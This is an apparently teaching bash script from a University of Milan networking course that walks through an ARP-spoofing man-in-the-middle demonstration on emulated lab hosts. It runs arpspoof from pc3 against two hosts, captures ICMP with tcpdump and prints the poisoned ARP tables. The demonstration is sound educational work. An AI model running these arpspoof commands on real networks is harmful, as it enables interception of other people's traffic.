#!/bin/bash

echo "------------------------------------"
echo "~   Corso di Reti di Calcolatori   ~"
echo "~ Universita degli Studi di Milano ~"
echo "------------------------------------"

echo "Autore: Patrizio Tufarolo <patrizio@tufarolo.eu>"
echo

Color_Off='\e[0m' 
bldgrn='\e[1;32m'

ok_colorato_per_log() {
        RED=$(tput setaf 1)
        GREEN=$(tput setaf 2)
        NORMAL=$(tput sgr0)
        LENMSG="$1"
        let COL=$(tput cols)-${LENMSG}
        printf "%${COL}s%s%s%s%s%s" "$NORMAL" "[" "$GREEN" "OK" "$NORMAL" "]"
}
do_cmd() {
	local cmd;
	local msg;
	cmd="$1"
	msg="$2"
	echo
	echo -e $bldgrn $cmd $Color_Off;
	eval "$cmd" 2>/dev/null
	echo
	echo -n "$msg"
	ok_colorato_per_log ${#msg}
	read -rsp $'\nPremere invio per continuare...\n'
}
do_cmd_pid() {
	local cmd;
	local msg;
	local pid;
	local __resultvar=$3;
	cmd="$1"
	msg="$2"
	
	echo
	echo -e $bldgrn $cmd $Color_Off;
	eval "$cmd & "
	pid=$!
	echo -n "$msg"
	ok_colorato_per_log ${#msg}
	read -rsp $'\nPremere invio per continuare...\n'
	eval $__resultvar=$pid;
}



sudo -i exit

EXPERIMENT="$(sudo himage -e pc1)"

do_cmd_pid "xterm -e 'sudo himage pc3 arpspoof -i eth0 -t 10.0.0.20 10.0.0.21'"				"=> Avvio arpspoofing con target 10.0.0.20 su PC3" pid1
do_cmd_pid "xterm -e 'sudo himage pc3 arpspoof -i eth0 -t 10.0.0.21 10.0.0.20'"				"=> Avvio arpspoofing con target 10.0.0.21 su PC3" pid2 
do_cmd_pid "xterm -e 'sudo himage pc3 tcpdump -i eth0 icmp'"						"=> Avvio arpspoofing tcpdump su PC3" pid3
do_cmd "sudo himage pc3 sysctl net.ipv4.conf.eth0.send_redirects=0"					"=> Disabilita ICMP redirect su PC3"
do_cmd "sudo himage pc1 ping -c 5 10.0.0.21"								"=> Lancio un ping da PC1 a PC2"
do_cmd "sudo himage pc1 ip neigh"									"=> Stampo la tabella ARP PC1"
do_cmd "sudo himage pc2 ip neigh"									"=> Stampo la tabella ARP PC2"
read -rsp $'\nPremere invio nuovamente per chiudere XTERM...\n'
sudo kill -9 $pid1 1>/dev/null 2>/dev/null;
sudo kill -9 $pid2 1>/dev/null 2>/dev/null;
sudo kill -9 $pid3 1>/dev/null 2>/dev/null;

